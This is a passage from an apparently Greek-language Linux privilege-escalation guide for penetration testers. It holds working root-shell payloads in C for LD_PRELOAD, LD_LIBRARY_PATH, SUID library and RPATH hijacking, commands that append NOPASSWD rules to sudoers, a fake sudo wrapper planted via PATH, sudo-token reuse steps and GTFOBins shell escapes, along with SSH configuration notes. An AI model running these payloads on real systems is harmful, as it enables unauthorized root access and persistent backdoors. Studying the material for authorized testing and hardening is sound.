Γρήγοροι έλεγχοι:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Αυτή η διαδρομή επίθεσης είναι ιδιαίτερα συνηθισμένη σε wrappers «maintenance»/«backup» που διατίθενται στο `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (αρχεία .so) που θα φορτωθούν από τον loader πριν από όλες τις υπόλοιπες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading μιας library.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η εκμετάλλευση αυτής της δυνατότητας, ιδιαίτερα με εκτελέσιμα **suid/sgid**, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο loader αγνοεί το **LD_PRELOAD** για εκτελέσιμα των οποίων το πραγματικό user ID (_ruid_) δεν αντιστοιχεί στο effective user ID (_euid_).
- Για εκτελέσιμα με suid/sgid, γίνεται preload μόνο των libraries που βρίσκονται σε standard paths και έχουν επίσης suid/sgid.

Η κλιμάκωση προνομίων μπορεί να συμβεί αν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος της εντολής `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να διατηρείται και να αναγνωρίζεται ακόμη και όταν εκτελούνται εντολές με `sudo`, οδηγώντας ενδεχομένως στην εκτέλεση αυθαίρετου κώδικα με αυξημένα προνόμια.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Αποθήκευση ως **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Στη συνέχεια, **μεταγλωττίστε το** χρησιμοποιώντας:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Τέλος, **escalate privileges** εκτελώντας

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Μια παρόμοια privesc μπορεί να γίνει αντικείμενο κατάχρησης αν ο attacker ελέγχει τη μεταβλητή περιβάλλοντος **LD_LIBRARY_PATH**, επειδή ελέγχει τη διαδρομή όπου θα αναζητηθούν οι βιβλιοθήκες.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Όταν συναντάτε ένα δυαδικό αρχείο με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να ελέγχετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Για παράδειγμα, αν συναντήσετε ένα σφάλμα όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_, αυτό υποδηλώνει πιθανότητα εκμετάλλευσης.

Για να γίνει exploit, θα πρέπει να δημιουργήσετε ένα αρχείο C, για παράδειγμα _"/path/to/.config/libcalc.c"_, το οποίο θα περιέχει τον ακόλουθο κώδικα:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Αυτός ο κώδικας, αφού μεταγλωττιστεί και εκτελεστεί, αποσκοπεί στην κλιμάκωση προνομίων μέσω χειρισμού των δικαιωμάτων αρχείων και εκτέλεσης ενός shell με αυξημένα προνόμια.

Μεταγλωττίστε το παραπάνω αρχείο C σε αρχείο shared object (.so) με:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Τέλος, η εκτέλεση του επηρεαζόμενου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας ενδεχομένως την παραβίαση του συστήματος.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Τώρα που εντοπίσαμε ένα SUID binary που φορτώνει μια βιβλιοθήκη από έναν φάκελο στον οποίο έχουμε δικαίωμα εγγραφής, ας δημιουργήσουμε τη βιβλιοθήκη σε αυτόν τον φάκελο με το απαραίτητο όνομα:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Αν λάβετε ένα σφάλμα όπως

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

αυτό σημαίνει ότι η βιβλιοθήκη που δημιουργήσατε πρέπει να έχει μια συνάρτηση που ονομάζεται `a_function_name`.

### GTFOBins

Το [**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα με Unix binaries που μπορεί να εκμεταλλευτεί ένας attacker για να παρακάμψει τοπικούς περιορισμούς ασφαλείας. Το [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο, αλλά για περιπτώσεις όπου μπορείτε να **εισάγετε μόνο arguments** σε μια εντολή.

Το project συγκεντρώνει νόμιμες λειτουργίες των Unix binaries που μπορούν να χρησιμοποιηθούν καταχρηστικά για διαφυγή από restricted shells, κλιμάκωση ή διατήρηση αυξημένων privileges, μεταφορά αρχείων, δημιουργία bind και reverse shells και διευκόλυνση άλλων εργασιών post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Αν έχετε πρόσβαση στο `sudo -l`, μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν βρίσκει τρόπο να εκμεταλλευτεί κάποιον κανόνα sudo.

### Επαναχρησιμοποίηση Sudo Tokens

Σε περιπτώσεις όπου έχετε **sudo access** αλλά όχι τον κωδικό πρόσβασης, μπορείτε να κλιμακώσετε τα privileges **περιμένοντας την εκτέλεση μιας εντολής sudo και έπειτα κάνοντας hijack το session token**.<sup>[[18]](#references)</sup>

Απαιτήσεις για την κλιμάκωση των privileges:

- Έχετε ήδη shell ως χρήστης "_sampleuser_"
- Ο "_sampleuser_" έχει **χρησιμοποιήσει το `sudo`** για να εκτελέσει κάτι τα **τελευταία 15 λεπτά** (από προεπιλογή, αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιούμε το `sudo` χωρίς να εισάγουμε κωδικό πρόσβασης)
- Το `cat /proc/sys/kernel/yama/ptrace_scope` επιστρέφει 0
- Το `gdb` είναι διαθέσιμο (μπορείτε να το ανεβάσετε)

(Μπορείτε να ενεργοποιήσετε προσωρινά το `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας το `/etc/sysctl.d/10-ptrace.conf` και ορίζοντας το `kernel.yama.ptrace_scope = 0`)

Αν πληρούνται όλες αυτές οι απαιτήσεις, **μπορείτε να κλιμακώσετε τα privileges χρησιμοποιώντας:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Το **πρώτο exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **ενεργοποιήσετε το sudo token στη συνεδρία σας** (δεν θα λάβετε αυτόματα root shell· εκτελέστε `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_, **με ιδιοκτήτη τον root και ενεργοποιημένο το setuid**.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- Το **third exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα αρχείο sudoers** που κάνει τα **sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Αν έχετε **δικαιώματα εγγραφής** στον φάκελο ή σε οποιοδήποτε από τα αρχεία που έχουν δημιουργηθεί μέσα στον φάκελο, μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσετε ένα sudo token για έναν χρήστη και PID**.\
Για παράδειγμα, αν μπορείτε να αντικαταστήσετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως αυτός ο χρήστης με PID 1234, μπορείτε να **αποκτήσετε sudo privileges** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό πρόσβασης, κάνοντας τα εξής:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιεί το `sudo` και με ποιον τρόπο. Αυτά τα αρχεία **από προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο, ίσως μπορέσετε να **αποκτήσετε ενδιαφέρουσες πληροφορίες**, ενώ αν μπορείτε να **γράψετε** σε οποιοδήποτε αρχείο, θα μπορέσετε να **κλιμακώσετε τα δικαιώματά σας**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Αν έχεις δικαίωμα εγγραφής, μπορείς να το καταχραστείς.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Ένας άλλος τρόπος να καταχραστείτε αυτά τα δικαιώματα:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Υπάρχουν ορισμένες εναλλακτικές στο δυαδικό αρχείο `sudo`, όπως το `doas` για το OpenBSD. Θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Αν το `doas` επιτρέπει τη χρήση editor ή interpreter, ελέγξτε για διαφυγές τύπου GTFOBins:

```bash
doas vim
:!/bin/sh
```

Ένας κανόνας `doas` με δυνατότητα εκτέλεσης ως root για το αρχικό `dstat` που βασίζεται στην Python αξίζει επίσης έλεγχο της διαδρομής των plugin. Το [εγχειρίδιό](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) του και ο [πηγαίος κώδικας](https://github.com/dstat-real/dstat/blob/master/dstat) αναφέρουν τα `/usr/share/dstat/` και `/usr/local/share/dstat/` μεταξύ των τοποθεσιών για plugin `dstat_*.py`. Αν ο τρέχων χρήστης μπορεί να γράψει σε μια τοποθεσία που χρησιμοποιεί πράγματι η εγκατεστημένη έκδοση και να αναζητήσει σε αυτήν, μπορεί να εκτελεστεί ένα επιλεγμένο plugin με την ταυτότητα RunAs του `doas`. Επιβεβαιώστε τον ενεργό κανόνα, την αναζήτηση plugin σε αυτή την έκδοση, τα δικαιώματα ή τις ACL του καταλόγου και των γονικών καταλόγων, καθώς και αν ο καλών μπορεί να επιλέξει plugin· ένας κανόνας `dstat` ή ένας εγγράψιμος κατάλογος από μόνος του αποτελεί απλώς ένδειξη. Άλλες υλοποιήσεις του `dstat` μπορεί να χρησιμοποιούν διαφορετικά συστήματα plugin. Επιθεωρήστε τα metadata παθητικά, χωρίς να φορτώσετε plugin.

### Sudo Hijacking

Αν γνωρίζετε ότι ένας **χρήστης συνδέεται συνήθως σε ένα μηχάνημα και χρησιμοποιεί το `sudo`** για να κλιμακώσει τα προνόμιά του και έχετε αποκτήσει shell στο πλαίσιο αυτού του χρήστη, μπορείτε να **δημιουργήσετε ένα νέο εκτελέσιμο `sudo`** που θα εκτελεί τον κώδικά σας ως root και έπειτα την εντολή του χρήστη. Στη συνέχεια, **τροποποιήστε το $PATH** του πλαισίου του χρήστη (για παράδειγμα, προσθέτοντας τη νέα διαδρομή στο .bash_profile), ώστε όταν ο χρήστης εκτελεί το sudo, να εκτελείται το δικό σας εκτελέσιμο `sudo`.

Σημειώστε ότι αν ο χρήστης χρησιμοποιεί διαφορετικό shell (όχι bash), θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε τη νέα διαδρομή. Για παράδειγμα, το [sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί τα `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε άλλο ένα παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή εκτελώντας κάτι όπως:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Κοινόχρηστη βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα αρχεία ρυθμίσεων που φορτώνονται**. Συνήθως, αυτό το αρχείο περιέχει την ακόλουθη διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι θα διαβαστούν τα αρχεία ρυθμίσεων από το `/etc/ld.so.conf.d/*.conf`. Αυτά τα αρχεία ρυθμίσεων **υποδεικνύουν άλλους φακέλους** στους οποίους θα γίνει **αναζήτηση** για **βιβλιοθήκες**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Αν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις διαδρομές που υποδεικνύονται — `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο μέσα στο αρχείο ρυθμίσεων του `/etc/ld.so.conf.d/*.conf` — ενδέχεται να μπορέσει να κάνει κλιμάκωση προνομίων.\
Δείτε **πώς να κάνετε exploit σε αυτή την εσφαλμένη ρύθμιση** στην ακόλουθη σελίδα:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Αντιγράφοντας τη lib στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτήν τη θέση, όπως ορίζεται στη μεταβλητή `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Στη συνέχεια, δημιουργήστε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με την εντολή `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Τα Linux capabilities παρέχουν σε μια **διεργασία ένα υποσύνολο των διαθέσιμων προνομίων root**. Αυτό ουσιαστικά διασπά τα **προνόμια root σε μικρότερες, διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να εκχωρείται ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο, μειώνεται το πλήρες σύνολο των προνομίων, περιορίζοντας τους κινδύνους εκμετάλλευσης.\
Διαβάστε την παρακάτω σελίδα για να **μάθετε περισσότερα σχετικά με τα capabilities και πώς να τα καταχραστείτε**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Δικαιώματα καταλόγων

Σε έναν κατάλογο, το **bit για «εκτέλεση»** σημαίνει ότι ο επηρεαζόμενος χρήστης μπορεί να κάνει «**cd**» στον φάκελο.\
Το bit **«ανάγνωσης»** σημαίνει ότι ο χρήστης μπορεί να **εμφανίσει τη λίστα** των **αρχείων**, ενώ το bit **«εγγραφής»** σημαίνει ότι μπορεί να **διαγράψει** και να **δημιουργήσει** νέα **αρχεία**.

## ACLs

Οι Access Control Lists (ACLs) αποτελούν το δευτερεύον επίπεδο διακριτικών δικαιωμάτων, με δυνατότητα **παράκαμψης των παραδοσιακών δικαιωμάτων ugo/rwx**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο της πρόσβασης σε αρχεία ή καταλόγους, επιτρέποντας ή αρνούμενα δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι οι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομερούς ελέγχου εξασφαλίζει ακριβέστερη διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες θα βρείτε [**εδώ**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Δώστε** στον χρήστη "kali" δικαιώματα ανάγνωσης και εγγραφής σε ένα αρχείο:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Λήψη** αρχείων με συγκεκριμένα ACL από το σύστημα:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Κρυφό backdoor μέσω ACL σε drop-in αρχεία sudoers

Μια συνηθισμένη λανθασμένη ρύθμιση είναι ένα αρχείο στο `/etc/sudoers.d/`, ιδιοκτησίας του root και με mode `440`, το οποίο εξακολουθεί να παρέχει δικαίωμα εγγραφής σε χρήστη χαμηλών προνομίων μέσω ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Αν δείτε κάτι όπως `user:alice:rw-`, ο χρήστης μπορεί να προσθέσει έναν κανόνα sudo παρά τα περιοριστικά bits δικαιωμάτων:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Αυτή είναι μια διαδρομή persistence/privesc μέσω ACL υψηλού αντίκτυπου, επειδή είναι εύκολο να παραβλεφθεί σε ελέγχους που βασίζονται μόνο στο `ls -l`.

## Ανοιχτές συνεδρίες shell

Η πρόσβαση μεταξύ χρηστών στο GNU Screen εξαρτάται από τη **διαμόρφωση και το ACL της ενεργής συνεδρίας**, όχι μόνο από την έκδοσή του. [Η τεκμηρίωση του GNU Screen αναφέρει](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) ότι πρέπει να έχει μεταγλωττιστεί με υποστήριξη multiuser· οι ρυθμίσεις `multiuser on` και `acladd` ή μια κατάλληλη παραχώρηση μέσω `aclchg` επιτρέπουν σε άλλον χρήστη να συνδεθεί. [Το εγχειρίδιο απαιτεί επίσης setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) για την αναζήτηση συνεδρίας μεταξύ χρηστών. Ένα ορατό socket που ανήκει στον root ή ένα SUID δυαδικό αρχείο `screen` από μόνο του δεν αποδεικνύει ότι υπάρχει shell root στο οποίο μπορεί να συνδεθεί κάποιος. Πριν το θεωρήσετε κλιμάκωση προνομίων, επιβεβαιώστε ότι η ενεργή συνεδρία είναι multiuser, ότι ο τρέχων χρήστης έχει αποτελεσματικά δικαιώματα εισόδου/εκτέλεσης εντολών και ότι το shell της συνεδρίας εκτελείται ως ο προνομιούχος ιδιοκτήτης.

### screen sessions hijacking

**Λίστα συνεδριών screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![Παραβίαση συνεδριών screen - Τοποθεσίες socket (σε ορισμένα συστήματα, το ένα είναι symlink του άλλου): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Σύνδεση σε μια συνεδρία**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux session hijacking

Αυτό ήταν πρόβλημα σε **παλιές εκδόσεις του tmux**. Δεν μπόρεσα να κάνω hijack μια συνεδρία tmux (v2.1) που είχε δημιουργηθεί από τον root, ως μη προνομιούχος χρήστης.

**Λίστα συνεδριών tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Τοποθεσίες socket (ορισμένα συστήματα εκθέτουν το ένα ως symlink του άλλου) - παραβίαση συνεδριών tmux: tmux -S /tmp/dev sess ls Εμφάνιση λίστας χρησιμοποιώντας αυτό το socket· μπορείτε να ξεκινήσετε μια συνεδρία tmux σε αυτό το socket...](<../../images/image (837).png>)

**Σύνδεση σε μια συνεδρία**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Ελέγξτε το **Valentine box from HTB** για ένα παράδειγμα.

## SSH

### Προβλέψιμο PRNG του Debian OpenSSL - CVE-2008-0166

Τα κλειδιά που δημιουργήθηκαν με επηρεαζόμενες εκδόσεις του OpenSSL στο Debian ή σε παράγωγές του κατά την ιστορική περίοδο ευπάθειας ενδέχεται να έχουν προβλέψιμη τυχαιότητα· η τρέχουσα διανομή του host ή η διορθωμένη έκδοση του OpenSSL δεν αποδεικνύει πώς δημιουργήθηκε ένα παλαιότερο κλειδί. Ελέγξτε το **συγκεκριμένο κλειδί** σε κατάλληλη ιστορική blacklist και επαληθεύστε την προέλευσή του. Το εγχειρίδιο του Debian [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) περιγράφει τον έλεγχο δημόσιων κλειδιών και του `authorized_keys`, ενώ το [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) καταγράφει τη διόρθωση του OpenSSL. Μια εγγραφή στο `authorized_keys` ενός προνομιούχου λογαριασμού αποτελεί πιθανό στοιχείο κλιμάκωσης μόνο αν μπορεί να ανακτηθεί το αντίστοιχο ιδιωτικό κλειδί και η ισχύουσα πολιτική SSH εξακολουθεί να αποδέχεται αυτό το κλειδί για τον συγκεκριμένο λογαριασμό· ένα αδύναμο **host key** δεν αποτελεί από μόνο του διαπιστευτήριο σύνδεσης. Αντικαταστήστε τα παραβιασμένα κλειδιά και αφαιρέστε τις παλιές εξουσιοδοτήσεις τους.

### Ενδιαφέρουσες τιμές ρύθμισης SSH

- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται η ταυτοποίηση με κωδικό πρόσβασης. Η προεπιλογή του upstream OpenSSH είναι `yes`· η ρύθμιση της διανομής μπορεί να την παρακάμψει.
- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται η ταυτοποίηση με δημόσιο κλειδί. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν επιτρέπεται η ταυτοποίηση με κωδικό πρόσβασης, καθορίζει αν ο server επιτρέπει τη σύνδεση σε λογαριασμούς με κενό κωδικό πρόσβασης. Η προεπιλογή είναι `no`.

### Αρχεία ελέγχου σύνδεσης

Αυτά τα αρχεία επηρεάζουν ποιος μπορεί να συνδεθεί και με ποιον τρόπο:

- **`/etc/nologin`**: αν υπάρχει, αποκλείει τις συνδέσεις μη-root χρηστών και εμφανίζει το μήνυμά του.
- **`/etc/securetty`**: περιορίζει από πού μπορεί να συνδεθεί ο root (allowlist TTY).
- **`/etc/motd`**: banner μετά τη σύνδεση (μπορεί να διαρρεύσει πληροφορίες για το περιβάλλον ή τη συντήρηση).

### PermitRootLogin

Καθορίζει αν ο root μπορεί να συνδεθεί μέσω ssh. Η προεπιλογή του upstream OpenSSH είναι `prohibit-password`· η ρύθμιση της διανομής μπορεί να την παρακάμψει. Πιθανές τιμές:

- `yes`: ο root μπορεί να συνδεθεί με κωδικό πρόσβασης και ιδιωτικό κλειδί
- `without-password` ή `prohibit-password`: ο root μπορεί να συνδεθεί μόνο με ιδιωτικό κλειδί
- `forced-commands-only`: ο root μπορεί να συνδεθεί μόνο με ιδιωτικό κλειδί και εφόσον έχουν καθοριστεί οι επιλογές commands
- `no` : όχι

### Αξιόπιστες αρχές έκδοσης πιστοποιητικών χρηστών SSH

Το `TrustedUserCAKeys` ορίζει τα δημόσια κλειδιά που εμπιστεύεται το sshd για την υπογραφή πιστοποιητικών **χρηστών**. Αν το αντίστοιχο ιδιωτικό κλειδί CA είναι αναγνώσιμο από χρήστη με χαμηλότερα προνόμια, εξετάστε ποιος μπορεί να λάβει πιστοποιητικό και με ποια principals λογαριασμών θα μπορούσε να ταυτοποιηθεί. Τα `AuthorizedPrincipalsFile` ή `AuthorizedPrincipalsCommand` μπορούν να περιορίσουν τα αποδεκτά ονόματα· αν δεν έχει ρυθμιστεί κανένα από τα δύο, το πιστοποιητικό πρέπει να περιέχει το όνομα του λογαριασμού-στόχου. Το `PermitRootLogin prohibit-password` αποκλείει την ταυτοποίηση του root με κωδικό πρόσβασης, αλλά μπορεί να επιτρέπει την ταυτοποίηση με πιστοποιητικό. Η έκθεση μιας διαδρομής κλειδιού από μόνη της δεν αποδεικνύει πρόσβαση: επιβεβαιώστε το ζεύγος δημόσιου/ιδιωτικού κλειδιού, τους ισχύοντες κανόνες `Match`, την πολιτική του λογαριασμού, τη φράση πρόσβασης του κλειδιού, την ανάκληση και τους αποδεκτούς αλγόριθμους υπογραφής. Μην συμπεριλαμβάνετε bytes ιδιωτικού κλειδιού στα αποτελέσματα enumeration. Δείτε το [εγχειρίδιο ρυθμίσεων του server OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Ένα ιδιωτικό κλειδί CA μπορεί επίσης να χρησιμοποιηθεί **χωρίς να είναι αναγνώσιμο** από τον τρέχοντα χρήστη, αν ένας κανόνας ανάθεσης προνομίων επιτρέπει στον χρήστη να εκτελεί έναν μη περιορισμένο [signer πιστοποιητικών, όπως το `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) με την ταυτότητα του κατόχου του κλειδιού. Συσχετίστε την ακριβή επιτρεπόμενη εντολή και τα ορίσματά της με την πρόσβαση του λογαριασμού signer στο κλειδί, τη δημόσια CA που εμπιστεύεται η ισχύουσα ρύθμιση του sshd, το principal που γίνεται αποδεκτό για τον λογαριασμό-στόχο, την ισχύ του πιστοποιητικού και την πολιτική σύνδεσης αυτού του λογαριασμού. Μια εντολή signer που έχει ανατεθεί ή ένα αρχείο έμπιστης CA από μόνο του δεν αποδεικνύει πρόσβαση σε άλλον λογαριασμό· μην υπογράφετε δοκιμαστικό πιστοποιητικό κατά την παθητική διερεύνηση.

### AuthorizedKeysFile

Καθορίζει τα αρχεία που περιέχουν τα δημόσια κλειδιά τα οποία μπορούν να χρησιμοποιηθούν για την ταυτοποίηση χρηστών. Μπορεί να περιέχει tokens όπως το `%h`, το οποίο αντικαθίσταται από τον home directory. **Μπορείτε να ορίσετε απόλυτες διαδρομές** (που αρχίζουν με `/`) ή **σχετικές διαδρομές από τον home directory του χρήστη**. Για παράδειγμα:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

